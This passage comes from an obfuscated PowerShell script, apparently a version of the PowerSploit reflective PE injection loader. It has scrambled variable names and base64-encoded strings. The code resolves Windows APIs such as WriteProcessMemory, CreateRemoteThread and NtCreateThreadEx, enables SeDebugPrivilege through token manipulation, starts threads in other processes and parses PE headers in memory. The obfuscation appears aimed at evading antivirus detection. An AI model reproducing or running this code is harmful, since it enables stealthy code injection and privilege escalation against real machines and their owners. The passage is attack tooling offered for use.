	    ${_/\/\/==\_/\/\/=\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${____/\_/=====\_/=}, ${____/==\_____/=\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${_/\/\/==\_/\/\/=\}
		${_____/=\_/\__/==\} = __/=======\_/=\/\/ kernel32.dll WaitForSingleObject
	    ${__/==\_/=\/====\_} = ___/\/\/\/=\/=\/=\ @([IntPtr], [UInt32]) ([UInt32])
	    ${_/\/\___/=\_/=\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_____/=\_/\__/==\}, ${__/==\_/=\/====\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${_/\/\___/=\_/=\/\}
		${___/==\/=====\__/} = __/=======\_/=\/\/ kernel32.dll WriteProcessMemory
        ${_/\_/=\/==\/=\_/=} = ___/\/\/\/=\/=\/=\ @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${_____/\/\/\/=\_/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/==\/=====\__/}, ${_/\_/=\/==\/=\_/=})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${_____/\/\/\/=\_/=}
		${__/\_/\_________/} = __/=======\_/=\/\/ kernel32.dll ReadProcessMemory
        ${/\______/\/==\/\_} = ___/\/\/\/=\/=\/=\ @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${__/\/\_/======\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\_/\_________/}, ${/\______/\/==\/\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${__/\/\_/======\/\}
		${___/==\_/=====\_/} = __/=======\_/=\/\/ kernel32.dll CreateRemoteThread
        ${/==\/\/=\/=\_/\/=} = ___/\/\/\/=\/=\/=\ @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${_/=\/\_/\_/====\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/==\_/=====\_/}, ${/==\/\/=\/=\_/\/=})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${_/=\/\_/\_/====\/}
		${/===\/=\/=\/=\/=\} = __/=======\_/=\/\/ kernel32.dll GetExitCodeThread
        ${______/\__/===\__} = ___/\/\/\/=\/=\/=\ @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${____/==\/\_/=====} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/=\/=\/=\/=\}, ${______/\__/===\__})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${____/==\/\_/=====}
		${_/=\_/\/\_/\____/} = __/=======\_/=\/\/ Advapi32.dll OpenThreadToken
        ${_/\__/=\__/===\_/} = ___/\/\/\/=\/=\/=\ @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${_/\___/\______/==} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\_/\/\_/\____/}, ${_/\__/=\__/===\_/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${_/\___/\______/==}
		${/======\____/\/==} = __/=======\_/=\/\/ kernel32.dll GetCurrentThread
        ${__/==\___/=\___/\} = ___/\/\/\/=\/=\/=\ @() ([IntPtr])
        ${___/\/\__/===\/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/======\____/\/==}, ${__/==\___/=\___/\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${___/\/\__/===\/\/}
		${/===\/\/=\_/\__/\} = __/=======\_/=\/\/ Advapi32.dll AdjustTokenPrivileges
        ${__/===\/==\___/\_} = ___/\/\/\/=\/=\/=\ @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${_/\_/=\/\/\/====\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/\/=\_/\__/\}, ${__/===\/==\___/\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${_/\_/=\/\/\/====\}
		${______/===\/\/\_/} = __/=======\_/=\/\/ Advapi32.dll LookupPrivilegeValueA
        ${/=\__/\/\_/\/=\/=} = ___/\/\/\/=\/=\/=\ @([String], [String], [IntPtr]) ([Bool])
        ${___/\/\_/===\/\/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${______/===\/\/\_/}, ${/=\__/\/\_/\/=\/=})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${___/\/\_/===\/\/\}
		${_/==\_/\/==\_/\_/} = __/=======\_/=\/\/ Advapi32.dll ImpersonateSelf
        ${_/===\__/\/\_____} = ___/\/\/\/=\/=\/=\ @([Int32]) ([Bool])
        ${_/\/=\_/=\/=\__/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/==\_/\/==\_/\_/}, ${_/===\__/\/\_____})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${_/\/=\_/=\/=\__/\}
        if (([Environment]::OSVersion.Version -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2))) {
		    ${__/\/====\/=\_/\/} = __/=======\_/=\/\/ NtDll.dll NtCreateThreadEx
            ${___/=\/\/\_/\/=\/} = ___/\/\/\/=\/=\/=\ @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${_/\/\_/\/\___/==\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\/====\/=\_/\/}, ${___/=\/\/\_/\/=\/})
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${_/\/\_/\/\___/==\}
        }
		${_/==\__/\__/\/\/\} = __/=======\_/=\/\/ Kernel32.dll IsWow64Process
        ${/=\/\/==\/===\/=\} = ___/\/\/\/=\/=\/=\ @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${_/=\_/\__/=\_/=\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/==\__/\__/\/\/\}, ${/=\/\/==\/===\/=\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${_/=\_/\__/=\_/=\/}
		${/===\/\/=\/\/\/\/} = __/=======\_/=\/\/ Kernel32.dll CreateThread
        ${/=\____/\/\__/=\/} = ___/\/\/\/=\/=\/=\ @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${/=\_/=\_/\/\/\_/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/\/=\/\/\/\/}, ${/=\____/\/\__/=\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${/=\_/=\_/\/\/\_/\}
		return $Win32Functions
	}
	Function _/=\_/\/==\/\_/===
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/=\/=\/=\_/==\/\},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${_/==\/==\__/=\/=\/}
		)
		[Byte[]]${_/\_/==\__/=\_/==} = [BitConverter]::GetBytes(${__/=\/=\/=\_/==\/\})
		[Byte[]]${_____/\/==\_/\___} = [BitConverter]::GetBytes(${_/==\/==\__/=\/=\/})
		[Byte[]]${/========\_/\/===} = [BitConverter]::GetBytes([UInt64]0)
		if (${_/\_/==\__/=\_/==}.Count -eq ${_____/\/==\_/\___}.Count)
		{
			${__/=\_/\/====\/\/} = 0
			for (${__/\_/\/=\/======} = 0; ${__/\_/\/=\/======} -lt ${_/\_/==\__/=\_/==}.Count; ${__/\_/\/=\/======}++)
			{
				${/==\/\/==\/\_/===} = ${_/\_/==\__/=\_/==}[${__/\_/\/=\/======}] - ${__/=\_/\/====\/\/}
				if (${/==\/\/==\/\_/===} -lt ${_____/\/==\_/\___}[${__/\_/\/=\/======}])
				{
					${/==\/\/==\/\_/===} += 256
					${__/=\_/\/====\/\/} = 1
				}
				else
				{
					${__/=\_/\/====\/\/} = 0
				}
				[UInt16]${_/\___/\_/===\/==} = ${/==\/\/==\/\_/===} - ${_____/\/==\_/\___}[${__/\_/\/=\/======}]
				${/========\_/\/===}[${__/\_/\/=\/======}] = ${_/\___/\_/===\/==} -band 0x00FF
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABzAHUAYgB0AHIAYQBjAHQAIABiAHkAdABlAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAHMA')))
		}
		return [BitConverter]::ToInt64(${/========\_/\/===}, 0)
	}
	Function ____/\/===\__/\/==
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/=\/=\/=\_/==\/\},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${_/==\/==\__/=\/=\/}
		)
		[Byte[]]${_/\_/==\__/=\_/==} = [BitConverter]::GetBytes(${__/=\/=\/=\_/==\/\})
		[Byte[]]${_____/\/==\_/\___} = [BitConverter]::GetBytes(${_/==\/==\__/=\/=\/})
		[Byte[]]${/========\_/\/===} = [BitConverter]::GetBytes([UInt64]0)
		if (${_/\_/==\__/=\_/==}.Count -eq ${_____/\/==\_/\___}.Count)
		{
			${__/=\_/\/====\/\/} = 0
			for (${__/\_/\/=\/======} = 0; ${__/\_/\/=\/======} -lt ${_/\_/==\__/=\_/==}.Count; ${__/\_/\/=\/======}++)
			{
				[UInt16]${_/\___/\_/===\/==} = ${_/\_/==\__/=\_/==}[${__/\_/\/=\/======}] + ${_____/\/==\_/\___}[${__/\_/\/=\/======}] + ${__/=\_/\/====\/\/}
				${/========\_/\/===}[${__/\_/\/=\/======}] = ${_/\___/\_/===\/==} -band 0x00FF
				if ((${_/\___/\_/===\/==} -band 0xFF00) -eq 0x100)
				{
					${__/=\_/\/====\/\/} = 1
				}
				else
				{
					${__/=\_/\/====\/\/} = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64(${/========\_/\/===}, 0)
	}
	Function ___/\__/==\/=\_/=\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/=\/=\/=\_/==\/\},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${_/==\/==\__/=\/=\/}
		)
		[Byte[]]${_/\_/==\__/=\_/==} = [BitConverter]::GetBytes(${__/=\/=\/=\_/==\/\})
		[Byte[]]${_____/\/==\_/\___} = [BitConverter]::GetBytes(${_/==\/==\__/=\/=\/})
		if (${_/\_/==\__/=\_/==}.Count -eq ${_____/\/==\_/\___}.Count)
		{
			for (${__/\_/\/=\/======} = ${_/\_/==\__/=\_/==}.Count-1; ${__/\_/\/=\/======} -ge 0; ${__/\_/\/=\/======}--)
			{
				if (${_/\_/==\__/=\_/==}[${__/\_/\/=\/======}] -gt ${_____/\/==\_/\___}[${__/\_/\/=\/======}])
				{
					return $true
				}
				elseif (${_/\_/==\__/=\_/==}[${__/\_/\/=\/======}] -lt ${_____/\/==\_/\___}[${__/\_/\/=\/======}])
				{
					return $false
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABjAG8AbQBwAGEAcgBlACAAYgB5AHQAZQAgAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAA==')))
		}
		return $false
	}
	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		[Byte[]]${/=\______/\/==\__} = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64(${/=\______/\/==\__}, 0))
	}
    Function ____/=\__/=\_/==\/
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value 
        )
        ${/=\/=\___/=====\/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        ${/===\/=\___/===\_} = "0x{0:X$(${/=\/=\___/=====\/})}" -f [Int64]$Value 
        return ${/===\/=\___/===\_}
    }
	Function __/=\__/===\/=\/\/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${___/=\_/=\_/=\/===},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${__/\/==\_/\_/\_/\_},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${__/\_/====\_/====\},
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		${_/==\______/\_/=\_}
		)
	    [IntPtr]${/=\_/\_____/=\_/\} = [IntPtr](____/\/===\__/\/== (${__/\_/====\_/====\}) (${_/==\______/\_/=\_}))
		${/========\/\__/\_} = ${__/\/==\_/\_/\_/\_}.EndAddress
		if ((___/\__/==\/=\_/=\ (${__/\/==\_/\_/\_/\_}.PEHandle) (${__/\_/====\_/====\})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAHMAbQBhAGwAbABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwBfAF8ALwA9AFwAXwAvAD0AXABfAC8APQBcAC8APQA9AD0AfQA=')))
		}
		if ((___/\__/==\/=\_/=\ (${/=\_/\_____/=\_/\}) (${/========\/\__/\_})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAGcAcgBlAGEAdABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwBfAF8ALwA9AFwAXwAvAD0AXABfAC8APQBcAC8APQA9AD0AfQA=')))
		}
	}
	Function _/=\_/==\__/\/==\/
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			${___/\/\__/=\_/\_/\},
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			${_/=\/\/===\_/=\__/}
		)
		for (${_/\__/=\/\/===\/\} = 0; ${_/\__/=\/\/===\/\} -lt ${___/\/\__/=\_/\_/\}.Length; ${_/\__/=\/\/===\/\}++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte(${_/=\/\/===\_/=\__/}, ${_/\__/=\/\/===\/\}, ${___/\/\__/=\_/\_/\}[${_/\__/=\/\/===\/\}])
		}
	}
	Function ___/\/\/\/=\/=\/=\
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${__/\/==\/=\_/\/\/=} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${__/\_____/=\_/=\/=} = [Void]
	    )
	    ${_______/=\/==\___} = [AppDomain]::CurrentDomain
	    ${___/\/====\_/==\/} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    ${_/\___/=\__/\/\__} = ${_______/=\/==\___}.DefineDynamicAssembly(${___/\/====\_/==\/}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${__/=\__/\/\/=\___} = ${_/\___/=\__/\/\__}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    ${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    ${/=\_/\_/=\/\/==\_} = ${/=\_____/\/\/=\_/}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${__/\/==\/=\_/\/\/=})
	    ${/=\_/\_/=\/\/==\_}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    ${__/\/\/\_/====\_/} = ${/=\_____/\/\/=\_/}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${__/\_____/=\_/=\/=}, ${__/\/==\/=\_/\/\/=})
	    ${__/\/\/\_/====\_/}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo ${/=\_____/\/\/=\_/}.CreateType()
	}
	Function __/=======\_/=\/\/
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${_/===\/\/==\/\__/=},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${___/\/\______/=\_/}
	    )
	    ${/==\/==\_/==\__/\} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    ${__/===\/\/=\___/=} = ${/==\/==\_/==\__/\}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    ${_/\/\_/\_/\__/\_/} = ${__/===\/\/=\___/=}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    ${_/\_/\/=====\/=\/} = ${__/===\/\/=\___/=}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))), [reflection.bindingflags] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA='))), $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	    ${_/\/=\/\/=\____/=} = ${_/\/\_/\_/\__/\_/}.Invoke($null, @(${_/===\/\/==\/\__/=}))
	    ${_/\__/===\/=\/==\} = New-Object IntPtr
	    ${/=\/=\_____/\_/\/} = New-Object System.Runtime.InteropServices.HandleRef(${_/\__/===\/=\/==\}, ${_/\/=\/\/=\____/=})
	    echo ${_/\_/\/=====\/=\/}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${/=\/=\_____/\_/\/}, ${___/\/\______/=\_/}))
	}
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[IntPtr]${/==\/\/=\_/\_/\/\} = $Win32Functions.GetCurrentThread.Invoke()
		if (${/==\/\/=\_/\_/\/\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
		}
		[IntPtr]${____/\____/\__/\/} = [IntPtr]::Zero
		[Bool]${/==\/\___/\__/\__} = $Win32Functions.OpenThreadToken.Invoke(${/==\/\/=\_/\_/\/\}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${____/\____/\__/\/})
		if (${/==\/\___/\__/\__} -eq $false)
		{
			${/==\/\_/==\/=\/=\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${/==\/\_/==\/=\/=\} -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				${/==\/\___/\__/\__} = $Win32Functions.ImpersonateSelf.Invoke(3)
				if (${/==\/\___/\__/\__} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGUAbABmAA==')))
				}
				${/==\/\___/\__/\__} = $Win32Functions.OpenThreadToken.Invoke(${/==\/\/=\_/\_/\/\}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${____/\____/\__/\/})
				if (${/==\/\___/\__/\__} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuAA==')))
				}
			}
			else
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7AC8APQA9AFwALwBcAF8ALwA9AD0AXAAvAD0AXAAvAD0AXAB9AA==')))
			}
		}
		[IntPtr]${_/==\/=\_/==\/\_/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		${/==\/\___/\__/\__} = $Win32Functions.LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), ${_/==\/=\_/==\/\_/})
		if (${/==\/\___/\__/\__} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAATABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA==')))
		}
		[UInt32]${__/\_/=====\__/==} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]${/==\/\/\_/\/=\/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/\_/=====\__/==})
		${/===\___/==\/===\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\/\/\_/\/=\/\/}, [Type]$Win32Types.TOKEN_PRIVILEGES)
		${/===\___/==\/===\}.PrivilegeCount = 1
		${/===\___/==\/===\}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/==\/=\_/==\/\_/}, [Type]$Win32Types.LUID)
		${/===\___/==\/===\}.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/===\___/==\/===\}, ${/==\/\/\_/\/=\/\/}, $true)
		${/==\/\___/\__/\__} = $Win32Functions.AdjustTokenPrivileges.Invoke(${____/\____/\__/\/}, $false, ${/==\/\/\_/\/=\/\/}, ${__/\_/=====\__/==}, [IntPtr]::Zero, [IntPtr]::Zero)
		${/==\/\_/==\/=\/=\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if ((${/==\/\___/\__/\__} -eq $false) -or (${/==\/\_/==\/=\/=\} -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/==\/\/\_/\/=\/\/})
	}
	Function _/==\__/=\/\_____/
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		${_/==\/=\_/\_/==\__},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${__/\_/====\_/====\},
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		${_/==\/=\/=\/=\/=\_} = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		[IntPtr]${_/\_/\____/==\/=\} = [IntPtr]::Zero
		${__/\_/\/=\/\____/} = [Environment]::OSVersion.Version
		if ((${__/\_/\/=\/\____/} -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and (${__/\_/\/=\/\____/} -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2)))
		{
			${___/=====\/\_/\__}= $Win32Functions.NtCreateThreadEx.Invoke([Ref]${_/\_/\____/==\/=\}, 0x1FFFFF, [IntPtr]::Zero, ${_/==\/=\_/\_/==\__}, ${__/\_/====\_/====\}, ${_/==\/=\/=\/=\/=\_}, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			${__/\/======\/=\/\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${_/\_/\____/==\/=\} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAATgB0AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkAEUAeAAuACAAUgBlAHQAdQByAG4AIAB2AGEAbAB1AGUAOgAgACQAewBfAF8AXwAvAD0APQA9AD0APQBcAC8AXABfAC8AXABfAF8AfQAuACAATABhAHMAdABFAHIAcgBvAHIAOgAgACQAewBfAF8ALwBcAC8APQA9AD0APQA9AD0AXAAvAD0AXAAvAFwAfQA=')))
			}
		}
		else
		{
			${_/\_/\____/==\/=\} = $Win32Functions.CreateRemoteThread.Invoke(${_/==\/=\_/\_/==\__}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${__/\_/====\_/====\}, ${_/==\/=\/=\/=\/=\_}, 0, [IntPtr]::Zero)
		}
		if (${_/\_/\____/==\/=\} -eq [IntPtr]::Zero)
		{
			Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAcgBlAG0AbwB0AGUAIAB0AGgAcgBlAGEAZAAsACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGkAcwAgAG4AdQBsAGwA'))) -ErrorAction Stop
		}
		return ${_/\_/\____/==\/=\}
	}
	Function __/\_/\__/===\/\/=
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/\/=\_/====\_/=\},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${_/=\____/=\/\/\__} = New-Object System.Object
		${/==\/===\/\___/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\/=\_/====\_/=\}, [Type]$Win32Types.IMAGE_DOS_HEADER)
		[IntPtr]${_/\/\/\_/\_/\/=\_} = [IntPtr](____/\/===\__/\/== ([Int64]${__/\/=\_/====\_/=\}) ([Int64][UInt64]${/==\/===\/\___/\/}.e_lfanew))
		${_/=\____/=\/\/\__} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ${_/\/\/\_/\_/\/=\_}
		${_/==\_/\/===\___/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\/\/\_/\_/\/=\_}, [Type]$Win32Types.IMAGE_NT_HEADERS64)
